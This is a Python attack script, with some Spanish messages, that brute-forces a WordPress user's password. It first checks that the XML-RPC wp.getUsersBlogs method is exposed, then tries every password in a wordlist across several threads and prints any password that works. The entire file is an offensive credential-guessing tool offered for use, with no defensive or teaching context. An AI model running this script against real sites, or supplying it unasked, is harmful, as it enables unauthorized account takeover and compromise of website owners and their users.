#!/usr/bin/python3
import sys 
import xmlrpc.client as xml
import threading
from time import sleep
import queue
import signal
from pwn import log
PYTHONIOENCODING='latin-1'
#ctrl + c
def def_handler(sig, frame):
    print("\n\n[ * ] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)


if len(sys.argv) !=5:
    print("usage: %s <url> <number of threads> <pass dictionary path> <username>" % (sys.argv[0]))
    exit(1)
user=sys.argv[4]
dictionary=sys.argv[3]
threads=sys.argv[2]
threads=int(threads)
url=sys.argv[1]
listMethods='<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'


getUserMethod='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>'


connection = xml.ServerProxy(url)

def vulnCheck():
    listMethodsCall = connection._ServerProxy__request('system.listMethods',())

    if 'wp.getUsersBlogs' in listMethodsCall:
        print("Appears to be vulnerable...")
    else:
        print("Target is not vulnerable to wp.getUsersBlogs method bruteforcing")
        exit(0)



def dictLoad(dictionary):
    try:
        wordlistcon=open(dictionary, "r", encoding="latin-1")
    except FileNotFoundError:
        print("Dictionary not found")
        exit(1)
    else:
        wordlist=wordlistcon.readlines()
        words=queue.Queue()
        p2=log.progress("Cargando diccionario: ")
    for word in wordlist:
        word=word.rstrip()
        words.put(word)
        p2.status(str(words.qsize()))
    p2.success()
    return words


def bruter(Wqueue, user):
    p1=log.progress("current password:")
    while not Wqueue.empty():
        password=Wqueue.get()
        try:
            connection._ServerProxy__request('wp.getUsersBlogs', (user, password))
        except:
            p1.status(password)
            continue
        else:
            print('Password has been found: %s' % (password))
            exit(0)


def main(dictionary, threadsAmount, user):
    wordlistQueue=dictLoad(dictionary)
    for th in range(threadsAmount):
        t=threading.Thread(target=bruter, args=(wordlistQueue, user))
        t.start()
        sleep(0.5)
    

if __name__ == "__main__":
    vulnCheck()
    main(dictionary, threads, user)
